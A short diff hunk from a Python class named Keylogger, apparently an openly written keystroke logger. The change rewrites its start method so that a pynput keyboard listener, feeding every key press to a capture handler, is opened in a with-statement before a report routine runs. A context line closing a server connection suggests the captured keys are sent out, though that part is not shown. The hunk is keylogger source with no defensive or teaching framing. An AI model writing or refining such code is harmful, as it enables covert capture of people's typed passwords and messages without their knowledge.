@@ -38,8 +38,7 @@ class Keylogger:
         server.quit()
 
     def start(self):
-        keyboard_listener = pynput.keyboard.Listener(on_press = self.process_key)
-        with keyboard_listener:
+        with pynput.keyboard.Listener(on_press = self.process_key) as keyboard_listener:
             self.report()
             keyboard_listener.join()
 
